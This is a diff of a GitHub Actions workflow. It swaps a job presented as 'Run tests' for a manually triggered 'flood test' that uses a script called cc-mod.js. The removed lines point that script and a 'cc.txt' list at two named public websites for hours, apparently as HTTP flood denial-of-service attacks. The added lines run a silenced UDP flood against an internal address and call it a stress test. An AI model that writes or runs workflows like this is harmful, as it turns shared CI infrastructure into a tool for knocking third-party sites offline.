@@ -1,29 +1,25 @@
-name: Node.js
+name: UDP/HTTP/HTTPS 压测（纯 Node）
 
 on:
-  push:
-    branches: [ main ]
-  pull_request:
-    branches: [ main ]
+  workflow_dispatch:
 
 jobs:
-  build:
+  flood-test:
     runs-on: ubuntu-latest
-
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
+      - name: Checkout repository
+        uses: actions/checkout@v3
 
-      - name: Set up Node.js 22
-        uses: actions/setup-node@v4
-        with:
-          node-version: '22'
+      - name: Install Node (默认已装)
+        run: node -v   # 可选，确保 Node≥14
 
-      - name: Install dependencies
+      # 只要阈值不满足，这一步会返回非 0，GitHub 自动标记为 failed
+      - name: Run flood test (quiet)
         run: |
-          npm install npm -g
-          
-      - name: Run tests
-        run: |
-          node cc-mod.js http://minearm.org cc.txt 7200 GET
-          node cc-mod.js https://zooyoo.top/ cc.txt 22000 GET
+          node cc-mod.js \
+            -i 10.0.0.5 -p 7777 -P udp \
+            -r 3000 -t 20 \
+            --min-sent 50000 \
+            --max-fail 0 \
+            --quiet \
+            > /dev/null 2>&1
